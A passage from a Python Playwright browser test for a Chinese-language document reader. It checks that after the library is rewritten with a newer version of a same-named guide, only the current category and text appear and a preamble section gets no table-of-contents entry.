            assert page.get_by_role("tablist", name="文档分类").get_by_role("tab").all_text_contents() == [
                "02_操作",
                "01_概览",
            ]

            def version(payload):
                payload["documents"] = [
                    {
                        "id": "revision-v2",
                        "title": "同名文档",
                        "path": "guide.md",
                        "sections": [
                            {
                                "id": "preamble-v2",
                                "title": "不应作为目录标题的前言",
                                "content": "这段前言仍保留在原文中。",
                                "heading_level": 0,
                            },
                            {"id": "section-v2", "title": "新版章节", "content": "# 新版章节\n\n准确第二版正文。"},
                        ],
                    }
                ]
                payload["navigation"] = {
                    "packages": [
                        {
                            "id": "pack",
                            "name": "固定版本",
                            "categories": [
                                {
                                    "id": "old",
                                    "name": "旧版已移除",
                                    "path": "",
                                    "children": [
                                        {"kind": "document", "id": "revision-v1", "name": "旧资料", "path": "guide.md"}
                                    ],
                                },
                                {
                                    "id": "new",
                                    "name": "新版有效",
                                    "path": "",
                                    "children": [
                                        {
                                            "kind": "document",
                                            "id": "revision-v2",
                                            "name": "同名文档",
                                            "path": "guide.md",
                                        }
                                    ],
                                },
                            ],
                        }
                    ]
                }

            rewrite_library(reader_file, version)
            page.goto(reader_file.as_uri() + "#section=section-v1")
            page.reload()
            page.get_by_role("button", name="知识文档", exact=True).click()
            assert page.get_by_role("tablist", name="文档分类").get_by_role("tab").all_text_contents() == ["新版有效"]
            expect(page.locator(".document")).to_contain_text("准确第二版正文")
            expect(page.get_by_text("旧资料", exact=True)).to_have_count(0)
            expect(page.locator(".document")).to_contain_text("这段前言仍保留在原文中。")
            expect(
                page.locator(".doc-list").get_by_role("button", name="不应作为目录标题的前言", exact=True)
            ).to_have_count(0)
        finally:
            browser.close()
